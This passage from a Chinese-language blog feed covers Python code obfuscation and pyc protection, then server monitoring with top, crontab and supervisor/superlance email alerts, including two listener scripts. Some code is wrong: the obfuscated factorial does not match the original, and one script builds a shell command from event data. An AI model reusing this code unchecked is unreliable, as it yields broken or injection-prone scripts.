class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def fact(n):</span><br><span class="line">    return fact_iter(n, 1)</span><br><span class="line"></span><br><span class="line">def fact_iter(num, product):</span><br><span class="line">    if num == 1:</span><br><span class="line">        return product</span><br><span class="line">    return fact_iter(num - 1, num * product)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">fact()</span><br></pre></td></tr></table></figure><p>混淆后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def broztlk(n):</span><br><span class="line">    return prux(n, 0 * 132 + 0 * 0 * 251 + 77 + 0 * 103 + 1)</span><br><span class="line"></span><br><span class="line">def rci(num, product):</span><br><span class="line">    if (num == 0 * 171 + 0 * 0 * 163 + 55 + 0 * 36 + 1):</span><br><span class="line">        return product</span><br><span class="line">    return rci(num - 0 * 57 + 0 * 1 * 113 + 81 + 0 * 166 + 1, num * product)</span><br><span class="line">if (__name__ == &apos;__ma&apos; + &apos;in__&apos;):</span><br><span class="line">    broztlk()</span><br></pre></td></tr></table></figure><p>如果再做一些变量替换就更看不出来它在干嘛了吧</p><ul><li>用py2exe/pyinstaller啥的打包一下<br>逆向只是时间问题</li><li>借助cython<br><a href="http://cython.org/" target="_blank" rel="noopener">cython</a>可以将python文件转换成c, 并编译成pyd文件. 一般将核心模块编译成pyd, 这样被破解的风险就大大降低了. 关于如何使用cython可以参考官网或者<a href="http://www.oschina.net/question/54100_39042" target="_blank" rel="noopener">这篇文章</a> 或者 <a href="http://blog.biicode.com/bii-internals-compiling-your-python-application-with-cython/" target="_blank" rel="noopener">这篇</a></li><li><p>使用自己的Bytecode指令集<br>也就是说自己编一个python虚拟机，代价较大</p></li><li><p>修改字节码<br>修改一些字节码使得代码逻辑无误，但是破坏了原来的pyc的结构，此时使用dis、marshal因为逆向的逻辑而无法解析，具体方法参考大佬<a href="http://blog.csdn.net/ir0nf1st/article/details/61650984" target="_blank" rel="noopener">http://blog.csdn.net/ir0nf1st/article/details/61650984</a></p></li></ul><p>参考链接：<br><a href="http://phantom0301.cc/2017/03/24/pythonopcode/" target="_blank" rel="noopener">http://phantom0301.cc/2017/03/24/pythonopcode/</a><br>        <a href="http://0x48.pw/2017/03/20/0x2f/#" target="_blank" rel="noopener">http://0x48.pw/2017/03/20/0x2f/#</a><br>        <a href="http://blog.csdn.net/ir0nf1st/article/details/61650984" target="_blank" rel="noopener">http://blog.csdn.net/ir0nf1st/article/details/61650984</a><br>        <a href="https://stackoverflow.com/questions/261638/how-do-i-protect-python-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/261638/how-do-i-protect-python-code</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;修改了程序源码，使用celery调用task调了半天，结果发现程序竟然一直没有生效。尝试过使源程序报错，从日志里找到信息，但是程序依然运行良好。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="后端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%90%8E%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="逆向" scheme="https://michaelwayneliu.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="pyc" scheme="https://michaelwayneliu.github.io/tags/pyc/"/>
    
  </entry>
  
  <entry>
    <title>实时监视服务资源占用and报警</title>
    <link href="https://michaelwayneliu.github.io/2018/01/13/%E5%AE%9E%E6%97%B6%E7%9B%91%E8%A7%86%E6%9C%8D%E5%8A%A1%E8%B5%84%E6%BA%90%E5%8D%A0%E7%94%A8and%E6%8A%A5%E8%AD%A6/"/>
    <id>https://michaelwayneliu.github.io/2018/01/13/实时监视服务资源占用and报警/</id>
    <published>2018-01-13T02:19:45.000Z</published>
    <updated>2018-01-13T02:33:47.034Z</updated>
    
    <content type="html"><![CDATA[<p>服务器莫名宕机，没有检查到原因，怀疑某进程占用资源过高导致。<br><a id="more"></a><br>服务器莫名宕机，没有检查到原因，怀疑某进程占用资源过高导致。</p><p>于是使用top+crontab定时监视资源占用</p><pre><code>TIPS：1.crontab执行的shell脚本命令要用绝对路径2.单独top命令不会自动退出，shell脚本必须要能够自动退出才会些数据到文件里面，所以一定要先单独测试会自动退出的带参数的top命令才行3.内容写入文件是&gt;,追加内容是&gt;&gt;</code></pre><p>创建一个toptest.sh脚本，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">NAME=&quot;/root/top_&quot;$(date +%Y-%m-%d-%H)</span><br><span class="line">/usr/bin/top  -b -d 1 -n 1   &gt;&gt; $NAME.txt</span><br><span class="line">/bin/echo -e  &apos;----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n&apos; &gt;&gt; $NAME.txt</span><br><span class="line">/usr/bin/top  -b -d 1 -n 1   &gt;&gt; $NAME.txt</span><br><span class="line">/bin/echo -e  &apos;----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n----------------------------------------------------------------------------------------------------------------------------------------------------\n&apos; &gt;&gt; $NAME.txt</span><br></pre></td></tr></table></figure><p>表示：每一秒更新一次，一共记录1次 将进程信息写入以日期命名的txt文件中<br>以echo -e写入换行，否则有误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x toptest.sh</span><br></pre></td></tr></table></figure><p>接着</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/10 * * * * /bin/bash /root/sh/toptest.sh</span><br></pre></td></tr></table></figure><p>表示每十分钟记录两次top输出</p><p>如果系统再次崩溃或者是某个supervisor监控的进程异常退出，想要实现报警效果呢？使用superlance</p><p><strong>superlance就是基于supervisor的事件机制实现的一系列命令行的工具集，它实现了许多supervisor本身没有实现的实用的进程监控和管理的特性，包括内存监控，http接口监控，邮件和短信通知机制等。同样的，superlance本身也是使用python编写的。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">easy_install superlance</span><br><span class="line">pip install superlance</span><br></pre></td></tr></table></figure><p>superlance是一系列命令行工具的集合，其包括以下这些命令：</p><ul><li>httpok<br>  通过定时对一个HTTP接口进行GET请求，根据请求是否成功来判定一个进程是否处于正常状态，如果不正常则对进程进行重启。</li><li>crashmail<br>当一个进程意外退出时，发送邮件告警。</li><li>memmon<br>当一个进程的内存占用超过了设定阈值时，发送邮件告警。</li><li>crashmailbatch<br>类似于crashmail的告警，但是一段时间内的邮件将会被合成起来发送，以避免邮件轰炸。</li><li>fatalmailbatch<br>当一个进程没有成功启动多次后会进入FATAL状态，此时发送邮件告警。与crashmailbatch一样会进行合成报警。</li><li>crashsms<br>当一个进程意外退出时发送短信告警，这个短信也是通过email网关来发送的。</li></ul><p>superlance是基于supervisor的，所以要利用Supervisord进行进程监控和报警需要利用Supervisord的Event特性，编写一个listener，监控进程状态的改变，然后执行指定的代码。event的发起方是supervisord进程，接收方是一个叫listener的东西。listener和program一样，都是supervisord的子进程。两者的在配置上，很多选项也都一样。</p><pre><code>1.当supervisord启动的时候，如果我们的listener配置为autostart=true的话，listener就会作为supervisor的子进程被启动。2.listener被启动之后，会向自己的stdout写一个&quot;READY&quot;的消息,此时父进程也就是supervisord读取到这条消息后，会认为listener处于就绪状态。3.listener处于就绪状态后，当supervisord产生的event在listener的配置的可接受的events中时，supervisord就会把该event发送给该listener。  4.listener接收到event后，我们就可以根据event的head，body里面的数据，做一系列的处理了。我们根据event的内容，判断，提取，报警等等操作。5.该干的活都干完之后，listener需要向自己的stdout写一个消息&quot;RESULT\nOK&quot;，supervisord接受到这条消息后。就知道listener处理event完毕了。</code></pre><p>Supervisord支持的Event有：</p><pre><code>PROCESS_STATE 进程状态发生改变PROCESS_STATE_STARTING 进程状态从其他状态转换为正在启动(Supervisord的配置项中有startsecs配置项，                          是指程序启动时需要程序至少稳定运行x秒才认为程序运行正常，在这x秒中程序状态为正在启动)PROCESS_STATE_RUNNING 进程状态由正在启动转换为正在运行PROCESS_STATE_BACKOFF 进程状态由正在启动转换为失败PROCESS_STATE_STOPPING 进程状态由正在运行转换为正在停止PROCESS_STATE_EXITED 进程状态由正在运行转换为退出PROCESS_STATE_STOPPED 进程状态由正在停止转换为已经停止(exited和stopped的区别是exited是程序自行退出，而stopped为人为控制其退出)PROCESS_STATE_FATAL 进程状态由正在运行转换为失败PROCESS_STATE_UNKNOWN 未知的进程状态REMOTE_COMMUNICATION 使用Supervisord的RPC接口与Supervisord进行通信PROCESS_LOG 进程产生日志输出，包括标准输出和标准错误输出PROCESS_LOG_STDOUT 进程产生标准输出PROCESS_LOG_STDERR 进程产生标准错误输出PROCESS_COMMUNICATION 进程的日志输出包含 和PROCESS_COMMUNICATION_STDOUT 进程的标准输出包含 和PROCESS_COMMUNICATION_STDERR 进程的标准错误输出包含 和SUPERVISOR_STATE_CHANGE_RUNNING Supervisord启动SUPERVISOR_STATE_CHANGE_STOPPING Supervisord停止TICK_5 每隔5秒触发TICK_60 每隔60秒触发TICK_3600 每隔3600触发PROCESS_GROUP Supervisord的进程组发生变化PROCESS_GROUP_ADDED 新增了Supervisord的进程组PROCESS_GROUP_REMOVED 删除了Supervisord的进程组</code></pre><p>详细的Event特性请参考：<a href="http://supervisord.org/events.html" target="_blank" rel="noopener">http://supervisord.org/events.html</a><br>我们可以利用Supervisord的特性监控进程并报警，如当进程异常退出时报警，或当进程产生错误输出是报警。<br>superlance使用sendmail来发送email，默认安装的话sendmail在ubuntu server已经安装好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install sendmail</span><br></pre></td></tr></table></figure><p><strong>这个地方有一个大坑，默认的时候crashmail使用的是linux系统的sendmail，发送出去的邮件很容易隐藏自己的信息，所以一般邮件服务商针对这些邮件会报错，大概是DSN, service unavailable， 貌似是你的ip地址和dns反解析不一致导致，所以无法发送邮件。<br>    所以本文采用的实际上是sendemail，一个非常强大的使用perl语言写的支持附件发送等诸多功能的脚本。</strong> </p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz //下载1.56版本</span><br><span class="line">tar -xzvf sendEmail-v1.56.tar.gz //解压后就可以使用了</span><br><span class="line">cd sendEmail-v1.56</span><br><span class="line">mv sendEmail /usr/local/bin/</span><br><span class="line">chmod +x /usr/local/bin/sendEmail</span><br></pre></td></tr></table></figure><p>使用很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/sendEmail 　　　命令主程序</span><br><span class="line">-f yxylinux@163.com  　　　　　发件人邮箱</span><br><span class="line">-s smtp.163.com       　　　　　发件人邮箱的smtp服务器</span><br><span class="line">-u &quot;我是邮件主题&quot;     　　　　　　邮件的标题</span><br><span class="line">-o message-content-type=html   邮件内容的格式,html表示它是html格式</span><br><span class="line">-o message-charset=utf8        邮件内容编码</span><br><span class="line">-xu yxylinux                    发件人邮箱的用户名</span><br><span class="line">-xp 123456               　　发件人邮箱密码</span><br><span class="line">-m &quot;我是邮件内容&quot;        　　邮件的具体内容</span><br></pre></td></tr></table></figure></p><p>-xp 是smtp服务器的授权码。不使用smtp发送的方式也可以，而且秒发，只是qq邮箱会把发送过来的邮件当做垃圾邮件<br>更多姿势参考<a href="http://blog.csdn.net/leshami/article/details/8314570" target="_blank" rel="noopener">这里</a></p><p>在开始编辑supervisor配置文件mail.conf 前，先补点知识，crashmail是一个主管“事件监听器”，用于订阅PROCESS_STATE_EXITED事件。当crashmail 收到该事件并且转换是“意外的”时，crashmail 会将电子邮件通知发送到已配置的地址。<br>尤其<strong>注意</strong>的是</p><pre><code>crashmail不能监视不是supervisord子进程的进程的进程状态。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[program:top]</span><br><span class="line">command=/usr/bin/top  -b</span><br><span class="line">user=root</span><br><span class="line">directory=/opt/</span><br><span class="line">stdout_logfile=/var/log/top/top.log</span><br><span class="line">stderr_logfile=/var/log/top/top.err</span><br><span class="line">stderr_logfile_maxbytes=1MB</span><br><span class="line">stderr_logfile_backups=10</span><br><span class="line">stdout_logfile_maxbytes=1MB</span><br><span class="line">stdout_logfile_backups=10</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br><span class="line">startsecs=10</span><br><span class="line"></span><br><span class="line">[eventlistener:crashmail-exited]</span><br><span class="line">command=crashmail -p top -s &quot;/usr/local/bin/sendEmail -f xxx@163.com -t xxx@qq.com -s smtp.163.com  -u &apos;报警&apos; -xu xxx -xp xxx -o message-charset=utf-8 -m&quot; -m xxx@qq.com</span><br><span class="line">#events=PROCESS_STATE_EXITED # 一般只是这一句就好了，测试中发现，下面一坨和这一行的效果是一样一样的，只有exited的时候才会触发</span><br><span class="line">events=PROCESS_STATE_EXITED,PROCESS_STATE_STOPPED,PROCESS_STATE_FATAL,PROCESS_LOG_STDERR</span><br><span class="line">redirect_stderr=false</span><br></pre></td></tr></table></figure><p>首先配置了一个名为top的进程监控项，其内容就是很简单的重复执行top -b，持续地输出当前系统的进程信息。<br>    随后配置了一个名为crashmail的事件监听器，它接受来自supervisor的PROCESS_STATE_EXITED事件，并且会触发crashmail的命令行调用。<br>    而在command参数中-p参数配置了crashmail只会对名为top的监控项作出响应。<br>    在上面的command中最后的-m后面没有东西了，因为crashmail会通过stdin输送给命令，也就是为啥邮件正文中有to 和 from这些本该是邮件header的内容。<br>    具体参考官档：<a href="http://superlance.readthedocs.io/en/latest/crashmail.html" target="_blank" rel="noopener">http://superlance.readthedocs.io/en/latest/crashmail.html</a></p><p>以上间接通过不断运行top并记录实现了服务器资源占用情况的监控，如果服务器崩溃会产生记录并报警。想要测试发送邮件的功能，可以通过shell的ps指令找到top -b 的进程id，使用kill -9的方式强行结束进程</p><h3 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h3><p>supervisor的事件机制是一个简单的 Listener/Notification模型, Listener通过标准输入来获取supervisor发来的事件通知, 然后通过标准输出来告诉supervisor事件处理结果。过程中传递的EventNotification 由head和body两部分组成，监听器的处理事件流程为: readline()读取head -&gt; 读取固定长度的data -&gt; 输出状态信息<br>head的结构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver:3.0 server:supervisor serial:35 pool:event_listener poolserial:35 eventname:PROCESS_STATE_RUNNING len:91</span><br></pre></td></tr></table></figure></p><pre><code>ver: 版本信息serial: supervisor给事件的编号, 第一个事件为1, 之后事件编号递增pool：这个是你的listener的pool的名字，一般你的listener只启动一个进程的的话，其实也就没有  eventpool: 产生event的event_listener名字poolserial: 与serial不同的是, 由于可以有多个eventpool,而且eventpool可以检测的范围事件范围可以不同， 这个poolserial是相对某个eventpool的编号eventname: supervisor 标准定义的事件状态len: data长度, 此长度十分重要,需要再通过标准输入读入len长度的数据, 某个event_notification才算读取完毕</code></pre><p>然后按照head的信息, 读入长度为len的数据, 这个数据就是event的data部分:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processname:application_demo_03 groupname:application_demo_03 from_state:STARTING pid:81292</span><br></pre></td></tr></table></figure><pre><code>processname: 触发事件的applicaiton名称groupname: 触发事件的application的组名称from_state: 事件触发状态之前的那个状态pid: 进程id</code></pre><p>于是有了代码，可以编写自己的接口函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding:utf-8</span><br><span class="line"> </span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">#childutils这个模块是supervisor的一个模型，可以方便我们处理event消息。。。当然我们也可以自己按照协议，用任何语言来写listener，只不过用childutils更加简便罢了</span><br><span class="line">from supervisor import childutils</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">import socket</span><br><span class="line">import fcntl</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">__doc__ = &quot;\033[32m%s,捕获PROCESS_STATE_EXITED事件类型,当异常退出时触发报警\033[0m&quot; % sys.argv[0]</span><br><span class="line"> </span><br><span class="line">def write_stdout(s):</span><br><span class="line">    sys.stdout.write(s)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">#定义异常，没啥大用其实</span><br><span class="line">class CallError(Exception):</span><br><span class="line">    def __init__(self,value):</span><br><span class="line">        self.value = value</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return repr(self.value)</span><br><span class="line">#定义处理event的类</span><br><span class="line">class ProcessesMonitor():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.stdin = sys.stdin</span><br><span class="line">        self.stdout = sys.stdout</span><br><span class="line"> </span><br><span class="line">    def runforever(self):</span><br><span class="line">        #定义一个无限循环，可以循环处理event，当然也可以不用循环，把listener的autorestart#配置为true，处理完一次event就让该listener退出，然后supervisord重启该listener，这样listen#er就可以处理新的event了</span><br><span class="line">        while 1:</span><br><span class="line">            #下面这个东西，是向stdout发送&quot;READY&quot;，然后就阻塞在这里，一直等到有event发过来</span><br><span class="line">            #headers,payload分别是接收到的header和body的内容</span><br><span class="line">            headers, payload = childutils.listener.wait(self.stdin, self.stdout)</span><br><span class="line">            #判断event是否是咱们需要的，不是的话，向stdout写入&quot;RESULT\NOK&quot;，并跳过当前</span><br><span class="line">            #循环的剩余部分</span><br><span class="line">            if not headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_EXITED&apos;:</span><br><span class="line">                childutils.listener.ok(self.stdout)</span><br><span class="line">                continue</span><br><span class="line"> </span><br><span class="line">            pheaders,pdata = childutils.eventdata(payload+&apos;\n&apos;)</span><br><span class="line">            #判读event是否是expected是否是expected的，expected的话为1，否则为0</span><br><span class="line">            #这里的判断是过滤掉expected的event</span><br><span class="line">            if int(pheaders[&apos;expected&apos;]):</span><br><span class="line">                childutils.listener.ok(self.stdout)</span><br><span class="line">                continue</span><br><span class="line"> </span><br><span class="line">            ip = self.get_ip(&apos;eth0&apos;)</span><br><span class="line">            #构造报警信息结构</span><br><span class="line">            msg = &quot;[Host:%s][Process:%s][pid:%s][exited unexpectedly fromstate:%s]&quot; % (ip,pheaders[&apos;processname&apos;],pheaders[&apos;pid&apos;],pheaders[&apos;from_state&apos;])</span><br><span class="line">            #调用报警接口，换成自己的接口</span><br><span class="line">            subprocess.call(&quot;/usr/local/bin/alert.py -m &apos;%s&apos;&quot; % msg,shell=True)</span><br><span class="line">            #stdout写入&quot;RESULT\nOK&quot;，并进入下一次循环</span><br><span class="line">            childutils.listener.ok(self.stdout)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &apos;&apos;&apos;def check_user(self):</span><br><span class="line">        userName = os.environ[&apos;USER&apos;]</span><br><span class="line">        if userName != &apos;root&apos;:</span><br><span class="line">            try:</span><br><span class="line">                raise MyError(&apos;must be run by root!&apos;)</span><br><span class="line">            except MyError as e:</span><br><span class="line">                write_stderr( &quot;Error occurred,value:%s\n&quot; % e.value)</span><br><span class="line">                sys.exit(255)&apos;&apos;&apos;</span><br><span class="line"> </span><br><span class="line">    def get_ip(self,ifname):</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        inet = fcntl.ioctl(s.fileno(), 0x8915, struct.pack(&apos;256s&apos;, ifname[:15]))</span><br><span class="line">        ret = socket.inet_ntoa(inet[20:24])</span><br><span class="line">        return ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    if len(sys.argv) == 2:</span><br><span class="line">        if sys.argv[1] == &apos;-h&apos; or sys.argv[1] == &apos;--help&apos;:</span><br><span class="line">            print __doc__</span><br><span class="line">            sys.exit(0)</span><br><span class="line">    #(options, args) = parser.parse_args()</span><br><span class="line">    #下面这个，表示只有supervisord才能调用该listener，否则退出</span><br><span class="line">    if not &apos;SUPERVISOR_SERVER_URL&apos; in os.environ:</span><br><span class="line">        try:</span><br><span class="line">            raise CallError(&quot;%s must be run as a supervisor event&quot; % sys.argv[0])</span><br><span class="line">        except CallError as e:</span><br><span class="line">            write_stderr(&quot;Error occurred,value: %s\n&quot; % e.value)</span><br><span class="line"> </span><br><span class="line">        return</span><br><span class="line"> </span><br><span class="line">    prog = ProcessesMonitor()</span><br><span class="line">    prog.runforever()</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line"># Author zhyaof(mail@zhyaof.net)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">    Suprevisord Listener example.</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def write_stdout(s):</span><br><span class="line">    sys.stdout.write(s)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">def write_stderr(s):</span><br><span class="line">    sys.stderr.write(s)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line"></span><br><span class="line">def baojing(msg=None, data=None):</span><br><span class="line">    if msg == None and data == None:</span><br><span class="line">        return</span><br><span class="line"># alert</span><br><span class="line"></span><br><span class="line">def parseData(data):</span><br><span class="line">    tmp = data.split(&apos;\n&apos;)</span><br><span class="line">    pheaders = dict([ x.split(&apos;:&apos;) for x in tmp[0].split() ])</span><br><span class="line">    pdata = None</span><br><span class="line">    if len(tmp) &gt; 1:</span><br><span class="line">        pdata = tmp[1]</span><br><span class="line">    return pheaders, pdata</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #Only supervisord can run this listener, otherwise exit.</span><br><span class="line">    if not &apos;SUPERVISOR_SERVER_URL&apos; in os.environ:</span><br><span class="line">        print &quot;%s must be run as a supervisor listener.&quot; % sys.argv[0]</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        #echo &apos;READY&apos; and wait for event for stdin.</span><br><span class="line">        write_stdout(&apos;READY\n&apos;)</span><br><span class="line">        line = sys.stdin.readline()  # read header line from stdin</span><br><span class="line">        headers = dict([ x.split(&apos;:&apos;) for x in line.split() ])</span><br><span class="line">        data = sys.stdin.read(int(headers[&apos;len&apos;])) # read the event payload</span><br><span class="line">        </span><br><span class="line">        if headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_EXITED&apos; or\</span><br><span class="line">           headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_FATAL&apos; or\</span><br><span class="line">           headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_STOPPED&apos;:</span><br><span class="line">            pheaders, pdata = parseData(data)</span><br><span class="line">            from_state = pheaders[&apos;from_state&apos;]</span><br><span class="line">            process_name = pheaders[&apos;processname&apos;]</span><br><span class="line">            if headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_EXITED&apos; and\</span><br><span class="line">                not int(pheaders[&apos;expected&apos;]):</span><br><span class="line">                msg = &apos;进程%s(PID: %s)异常退出，请检查进程状态.&apos;\</span><br><span class="line">                    % (process_name, pheaders[&apos;pid&apos;])</span><br><span class="line">                baojing(msg=msg)</span><br><span class="line">            if headers[&apos;eventname&apos;] == &apos;PROCESS_STATE_FATAL&apos;:</span><br><span class="line">                msg = &apos;进程%s启动失败，请检查进程状态.&apos;\</span><br><span class="line">                    % (process_name)</span><br><span class="line">                baojing(msg=msg)</span><br><span class="line">        elif headers[&apos;eventname&apos;] == &apos;PROCESS_LOG_STDERR&apos;:</span><br><span class="line">            pheaders, pdata = parseData(data)</span><br><span class="line">            process_name = pheaders[&apos;processname&apos;]</span><br><span class="line">            pid = pheaders[&apos;pid&apos;]</span><br><span class="line">            msg = 